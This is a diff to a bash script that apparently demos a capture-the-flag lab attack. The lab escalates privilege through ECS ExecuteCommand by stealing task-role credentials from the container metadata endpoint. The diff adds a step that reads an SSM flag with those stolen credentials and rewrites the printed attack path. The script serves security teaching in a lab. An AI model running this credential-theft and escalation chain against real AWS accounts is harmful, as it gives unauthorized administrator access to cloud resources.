@@ -42,9 +42,6 @@ ECS_CLUSTER="pl-prod-ecs-006-to-admin-cluster"
 ECS_SERVICE="pl-prod-ecs-006-to-admin-service"
 CONTAINER_NAME="sleep-container"
 
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
-
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}ECS ExecuteCommand Privilege Escalation Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
@@ -408,9 +405,27 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     fi
     echo ""
 
-    # Final summary
+    # Step 11: Capture the CTF flag
+    # [EXPLOIT] The stolen task role credentials have AdministratorAccess, which grants
+    # ssm:GetParameter implicitly. Use those credentials to read the scenario flag.
+    echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+    FLAG_PARAM_NAME="/pathfinding-labs/flags/ecs-006-to-admin"
+    show_attack_cmd "Attacker (task role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+    FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+        echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
+    else
+        echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
+        exit 1
+    fi
+    echo ""
+
+    # Restore helpful permissions for manual exploration
+    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
     echo -e "\n${GREEN}========================================${NC}"
-    echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+    echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo -e "\n${YELLOW}Attack Summary:${NC}"
     echo "1. Started as: $STARTING_USER (with ecs:ExecuteCommand permissions)"
@@ -419,12 +434,13 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     echo "4. Used ecs:ExecuteCommand to shell into the task"
     echo "5. Retrieved IAM role credentials from task metadata endpoint"
     echo "6. Achieved: Administrator Access via stolen task role credentials"
+    echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
     echo -e "\n${YELLOW}Attack Path:${NC}"
-    echo "  $STARTING_USER"
-    echo "  -> (ecs:ExecuteCommand) -> ECS Task Container"
-    echo "  -> (curl metadata) -> Task Role Credentials"
-    echo "  -> $TARGET_ROLE -> Admin Access"
+    echo -e "  $STARTING_USER"
+    echo -e "  -> (ecs:ExecuteCommand + ecs:DescribeTasks) -> ECS Task Container"
+    echo -e "  -> (curl metadata) -> $TARGET_ROLE credentials"
+    echo -e "  -> (ssm:GetParameter) -> CTF Flag"
 
     if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
         echo -e "\n${YELLOW}Attack Commands:${NC}"
